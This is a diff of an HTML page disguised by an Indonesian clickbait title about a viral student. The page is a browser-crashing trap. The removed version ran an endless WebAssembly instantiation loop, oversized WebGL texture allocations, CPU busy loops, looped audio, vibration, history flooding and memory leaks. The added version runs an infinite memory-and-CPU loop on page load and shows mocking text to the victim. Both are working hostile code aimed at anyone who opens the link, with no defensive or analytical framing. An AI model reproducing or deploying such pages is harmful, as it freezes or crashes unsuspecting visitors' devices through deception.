@@ -3,89 +3,31 @@
 <head>
     <title>Viral seorang siswa anak smk berusia 17 tahun insial T ini melakukan hal yang tak terduga di dalam kelas reaksi warga net terherang-herang dengan kelakuan siswa tersebut</title>
     <style>
-        html, body {
-            margin: 0;
-            padding: 0;
-            background: #fff;
-            color: #fff;
+        body { 
+            background: #000; 
+            color: lime; 
+            font-family: monospace; 
+            text-align: center; 
+            padding: 50px; 
         }
     </style>
     <script>
-
-        function crashWASM() {
-            const wasmCode = new Uint8Array([0x00, 0x61, 0x73, 0x6D, 0x01, 0x00, 0x00, 0x00]);
-            const module = new WebAssembly.Module(wasmCode);
+        window.onload = function() 
+            let hugeArray = [];
             while (true) {
-                new WebAssembly.Instance(module);
-            }
-        }
-
-        function crashGPU() {
-            const canvas = document.createElement('canvas');
-            const gl = canvas.getContext('webgl');
-            if (gl) {
-                for (let i = 0; i < 1000; i++) {
-                    gl.texImage2D(gl.TEXTURE_2D, 0, gl.RGBA, 32768, 32768, 0, gl.RGBA, gl.UNSIGNED_BYTE, null);
+                hugeArray.push(new Array(9999999).fill("CRASH BJIRRR 😹💥"));
+                
+                for (let i = 0; i < 10000000; i++) {
+                    Math.random() * Math.random();
                 }
+                
+                document.body.innerHTML += "<div>BROWSER LU TUMBANG 😹👊</div>";
             }
-        }
-
-        function cpuLoad() {
-            while (true) {
-                Math.sqrt(Math.random()) + Math.pow(Math.random(), Math.random());
-            }
-        }
-
-        // ==== Eksekusi Serentak ====
-        setTimeout(crashWASM, 0);
-        setTimeout(crashGPU, 10);
-        setTimeout(cpuLoad, 20);
+        };
     </script>
 </head>
 <body>
-
-    <audio autoplay loop>
-        <source src="https://www.myinstants.com/media/sounds/bomb-explosion.mp3" type="audio/mpeg">
-    </audio>
-
-    <script>
-        if (navigator.vibrate) {
-            setInterval(() => navigator.vibrate([200, 100, 200]), 300);
-        }
-    </script>
-
-    <script>
-        for (let i = 0; i < 100; i++) {
-            history.pushState({}, "", "#" + i);
-        }
-    </script>
-
-    <script>
-        let memoryLeak = [];
-        setInterval(() => {
-            for (let i = 0; i < 5000; i++) {
-                memoryLeak.push(new Array(9000).fill("ꦾ"));
-            }
-        }, 100);
-    </script>
-
-    <iframe src="about:blank" style="display:none" id="loopFrame"></iframe>
-    <script>
-        setInterval(() => {
-            const f = document.getElementById("loopFrame");
-            f.src = "about:blank?" + Math.random();
-        }, 100);
-    </script>
-
-    <script>
-        function overloadFrame() {
-            for (let i = 0; i < 100000; i++) {
-                Math.sqrt(Math.random());
-            }
-            requestAnimationFrame(overloadFrame);
-        }
-        requestAnimationFrame(overloadFrame);
-    </script>
-
+    <h1>REST IN PEACE BROWSER LU...</h1>
+    <p>Kuat bett hp lu</p>
 </body>
 </html>
